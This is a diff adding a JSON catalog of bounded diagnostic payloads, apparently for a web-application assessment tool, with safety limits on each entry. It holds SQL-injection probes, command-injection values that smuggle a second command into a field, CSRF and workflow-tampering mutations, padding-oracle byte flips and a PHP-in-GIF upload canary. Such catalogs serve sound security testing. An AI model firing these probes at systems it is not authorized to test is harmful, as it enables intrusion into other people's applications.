@@ -1,0 +1,261 @@
+{
+  "schemaVersion": 1,
+  "catalog": {
+    "id": "scopepilot-workflow-payloads",
+    "version": "2.0.0",
+    "source": "ScopePilot curated payload set",
+    "publishedAt": "2026-10-26",
+    "generated": false,
+    "description": "Context-aware, paired and bounded diagnostic inputs for stateful web application assessment."
+  },
+  "payloads": [
+    {
+      "id": "auth.invalid-password",
+      "capability": "authentication-throttling",
+      "contexts": ["query", "form", "json"],
+      "platforms": ["any"],
+      "template": "ScopePilot-invalid-{{marker}}-{{attempt}}",
+      "variables": ["marker", "attempt"],
+      "oracle": "rate-limit-profile",
+      "tags": ["credential", "negative-control"],
+      "safety": { "risk": "state-changing", "maxAttempts": 12, "requiresConfirmation": true, "requiresTestAccount": true, "requiresRollback": true, "leavesResidue": false, "cleanupStrategy": "Verify the supplied test account remains usable and stop immediately on lockout." }
+    },
+    {
+      "id": "sqli.boolean.quoted.true",
+      "capability": "sql-injection",
+      "contexts": ["query", "form", "json", "workflow"],
+      "platforms": ["sql"],
+      "template": "1' AND '1'='1",
+      "variables": [],
+      "pairId": "sqli.boolean.quoted.false",
+      "oracle": "downstream-differential",
+      "tags": ["boolean", "quoted", "true-control"],
+      "safety": { "risk": "read-only", "maxAttempts": 2, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "sqli.boolean.quoted.false",
+      "capability": "sql-injection",
+      "contexts": ["query", "form", "json", "workflow"],
+      "platforms": ["sql"],
+      "template": "1' AND '1'='2",
+      "variables": [],
+      "pairId": "sqli.boolean.quoted.true",
+      "oracle": "downstream-differential",
+      "tags": ["boolean", "quoted", "false-control"],
+      "safety": { "risk": "read-only", "maxAttempts": 2, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "sqli.boolean.numeric.true",
+      "capability": "sql-injection",
+      "contexts": ["query", "form", "json", "workflow"],
+      "platforms": ["sql"],
+      "template": "1 AND 1=1",
+      "variables": [],
+      "pairId": "sqli.boolean.numeric.false",
+      "oracle": "downstream-differential",
+      "tags": ["boolean", "numeric", "true-control"],
+      "safety": { "risk": "read-only", "maxAttempts": 2, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "sqli.boolean.numeric.false",
+      "capability": "sql-injection",
+      "contexts": ["query", "form", "json", "workflow"],
+      "platforms": ["sql"],
+      "template": "1 AND 1=2",
+      "variables": [],
+      "pairId": "sqli.boolean.numeric.true",
+      "oracle": "downstream-differential",
+      "tags": ["boolean", "numeric", "false-control"],
+      "safety": { "risk": "read-only", "maxAttempts": 2, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "command.posix.semicolon.marker",
+      "capability": "command-injection",
+      "contexts": ["query", "form", "json"],
+      "platforms": ["posix"],
+      "template": "127.0.0.1; printf {{marker}}",
+      "variables": ["marker"],
+      "oracle": "marker-in-response",
+      "tags": ["separator", "marker", "posix"],
+      "safety": { "risk": "read-only", "maxAttempts": 1, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "command.posix.and.true",
+      "capability": "command-injection",
+      "contexts": ["query", "form", "json"],
+      "platforms": ["posix"],
+      "template": "127.0.0.1; true",
+      "variables": [],
+      "pairId": "command.posix.and.false",
+      "oracle": "response-differential",
+      "tags": ["exit-code", "true-control", "posix"],
+      "safety": { "risk": "read-only", "maxAttempts": 2, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "command.posix.and.false",
+      "capability": "command-injection",
+      "contexts": ["query", "form", "json"],
+      "platforms": ["posix"],
+      "template": "127.0.0.1; false",
+      "variables": [],
+      "pairId": "command.posix.and.true",
+      "oracle": "response-differential",
+      "tags": ["exit-code", "false-control", "posix"],
+      "safety": { "risk": "read-only", "maxAttempts": 2, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "command.posix.pipe.marker",
+      "capability": "command-injection",
+      "contexts": ["query", "form", "json"],
+      "platforms": ["posix"],
+      "template": "127.0.0.1 | printf {{marker}}",
+      "variables": ["marker"],
+      "oracle": "marker-in-response",
+      "tags": ["separator", "marker", "posix"],
+      "safety": { "risk": "read-only", "maxAttempts": 1, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "command.posix.newline.marker",
+      "capability": "command-injection",
+      "contexts": ["query", "form", "json"],
+      "platforms": ["posix"],
+      "template": "127.0.0.1%0Aprintf%20{{marker}}",
+      "variables": ["marker"],
+      "oracle": "marker-in-response",
+      "tags": ["encoded-newline", "marker", "posix"],
+      "safety": { "risk": "read-only", "maxAttempts": 1, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "command.windows.ampersand.marker",
+      "capability": "command-injection",
+      "contexts": ["query", "form", "json"],
+      "platforms": ["windows"],
+      "template": "127.0.0.1 & echo {{marker}}",
+      "variables": ["marker"],
+      "oracle": "marker-in-response",
+      "tags": ["separator", "marker", "windows"],
+      "safety": { "risk": "read-only", "maxAttempts": 1, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "csrf.omit-token",
+      "capability": "csrf-control",
+      "contexts": ["form", "json", "header", "workflow"],
+      "platforms": ["any"],
+      "variables": [],
+      "oracle": "state-change-verification",
+      "tags": ["token", "negative-control"],
+      "safety": { "risk": "state-changing", "maxAttempts": 1, "requiresConfirmation": true, "requiresTestAccount": true, "requiresRollback": true, "leavesResidue": false, "cleanupStrategy": "Execute the registered rollback workflow and verify the original value in a separate session." },
+      "mutation": { "operator": "omit-field", "target": "anti-csrf-token" }
+    },
+    {
+      "id": "csrf.reuse-token",
+      "capability": "csrf-control",
+      "contexts": ["form", "json", "header", "workflow"],
+      "platforms": ["any"],
+      "variables": [],
+      "oracle": "state-change-verification",
+      "tags": ["token", "replay"],
+      "safety": { "risk": "state-changing", "maxAttempts": 1, "requiresConfirmation": true, "requiresTestAccount": true, "requiresRollback": true, "leavesResidue": false, "cleanupStrategy": "Execute the registered rollback workflow and verify the original value in a separate session." },
+      "mutation": { "operator": "reuse-value", "target": "anti-csrf-token" }
+    },
+    {
+      "id": "csrf.cross-session-token",
+      "capability": "csrf-control",
+      "contexts": ["form", "json", "header", "session", "workflow"],
+      "platforms": ["any"],
+      "variables": [],
+      "oracle": "state-change-verification",
+      "tags": ["token", "session-binding"],
+      "safety": { "risk": "state-changing", "maxAttempts": 1, "requiresConfirmation": true, "requiresTestAccount": true, "requiresRollback": true, "leavesResidue": false, "cleanupStrategy": "Execute the registered rollback workflow and verify both test sessions." },
+      "mutation": { "operator": "cross-session-value", "target": "anti-csrf-token" }
+    },
+    {
+      "id": "workflow.skip-confirmation-step",
+      "capability": "workflow-state",
+      "contexts": ["workflow"],
+      "platforms": ["any"],
+      "variables": [],
+      "oracle": "state-change-verification",
+      "tags": ["step", "sequence"],
+      "safety": { "risk": "state-changing", "maxAttempts": 1, "requiresConfirmation": true, "requiresTestAccount": true, "requiresRollback": true, "leavesResidue": false, "cleanupStrategy": "Execute the registered rollback workflow and verify the original state." },
+      "mutation": { "operator": "skip-step", "target": "confirmation-step" }
+    },
+    {
+      "id": "workflow.replace-client-state",
+      "capability": "workflow-state",
+      "contexts": ["form", "json", "workflow"],
+      "platforms": ["any"],
+      "variables": ["observedClientConstant"],
+      "oracle": "state-change-verification",
+      "tags": ["client-state", "observed-constant"],
+      "safety": { "risk": "state-changing", "maxAttempts": 3, "requiresConfirmation": true, "requiresTestAccount": true, "requiresRollback": true, "leavesResidue": false, "cleanupStrategy": "Execute the registered rollback workflow and verify the original state." },
+      "mutation": { "operator": "replace-field", "target": "client-controlled-state", "valueTemplate": "{{observedClientConstant}}" }
+    },
+    {
+      "id": "csp.nonce-reuse",
+      "capability": "csp-runtime",
+      "contexts": ["html", "browser"],
+      "platforms": ["browser"],
+      "variables": [],
+      "oracle": "response-differential",
+      "tags": ["nonce", "reuse"],
+      "safety": { "risk": "read-only", "maxAttempts": 3, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false },
+      "mutation": { "operator": "reuse-value", "target": "csp-nonce" }
+    },
+    {
+      "id": "csp.jsonp-callback",
+      "capability": "csp-runtime",
+      "contexts": ["query", "html", "browser"],
+      "platforms": ["browser"],
+      "template": "{{callback}}",
+      "variables": ["callback"],
+      "oracle": "browser-side-effect",
+      "tags": ["jsonp", "callback", "same-origin-only"],
+      "safety": { "risk": "read-only", "maxAttempts": 2, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "browser.inline-canary",
+      "capability": "browser-canary",
+      "contexts": ["html", "browser"],
+      "platforms": ["browser"],
+      "template": "<script nonce=\"{{nonce}}\">document.documentElement.dataset.scopepilot=\"{{marker}}\"</script>",
+      "variables": ["nonce", "marker"],
+      "oracle": "browser-side-effect",
+      "tags": ["dom", "canary", "no-network"],
+      "safety": { "risk": "read-only", "maxAttempts": 1, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false }
+    },
+    {
+      "id": "crypto.cbc.iv-last-byte",
+      "capability": "padding-oracle",
+      "contexts": ["binary", "form", "json"],
+      "platforms": ["any"],
+      "variables": [],
+      "oracle": "response-cluster",
+      "tags": ["cbc", "iv", "differential"],
+      "safety": { "risk": "read-only", "maxAttempts": 4, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false },
+      "mutation": { "operator": "xor-byte", "target": "iv", "byteOffset": -1, "xorValue": 1 }
+    },
+    {
+      "id": "crypto.cbc.cipher-first-byte",
+      "capability": "padding-oracle",
+      "contexts": ["binary", "form", "json"],
+      "platforms": ["any"],
+      "variables": [],
+      "oracle": "response-cluster",
+      "tags": ["cbc", "ciphertext", "differential"],
+      "safety": { "risk": "read-only", "maxAttempts": 4, "requiresConfirmation": false, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": false },
+      "mutation": { "operator": "xor-byte", "target": "ciphertext", "byteOffset": 0, "xorValue": 1 }
+    },
+    {
+      "id": "upload.php-gif-canary",
+      "capability": "file-upload",
+      "contexts": ["multipart", "workflow"],
+      "platforms": ["php"],
+      "template": "GIF89a\n<?php echo \"{{marker}}\"; ?>",
+      "variables": ["marker"],
+      "oracle": "artifact-retrieval",
+      "tags": ["polyglot", "canary", "php"],
+      "safety": { "risk": "artifact-producing", "maxAttempts": 1, "requiresConfirmation": true, "requiresTestAccount": false, "requiresRollback": false, "leavesResidue": true, "cleanupStrategy": "Delete the uniquely named canary through an authorized cleanup endpoint when available; otherwise record the exact residual URL and marker." }
+    }
+  ]
+}
